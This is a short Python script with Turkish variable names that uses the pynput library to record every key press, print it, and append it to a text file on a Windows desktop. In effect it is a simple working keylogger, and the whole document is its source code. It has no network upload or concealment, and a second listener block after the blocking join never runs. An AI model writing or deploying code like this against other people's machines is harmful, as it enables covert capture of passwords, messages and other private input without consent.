from pynput import keyboard

def tusaBasildiginda(tus):
    try:
        print("Basilan tus: {0}".format(tus.char))
        dosya = open("C:\\Users\\User\\Desktop\\basilanTuslar.txt", "a", encoding="utf8")
        dosya.write(tus.char)
    except AttributeError:
        print("Basilan tus: {0}".format(tus))
        dosya = open("C:\\Users\\User\\Desktop\\basilanTuslar.txt", "a", encoding="utf8")
        dosya.write("\n"+str(tus)+"\n")

def tusBirakildiginda(tus):
    # print("Birakilan tus: {0}".format(tus.char))
    pass

with keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakildiginda) as dinleyici:
    dinleyici.join()

dinleyici = keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakildiginda)
dinleyici.start()
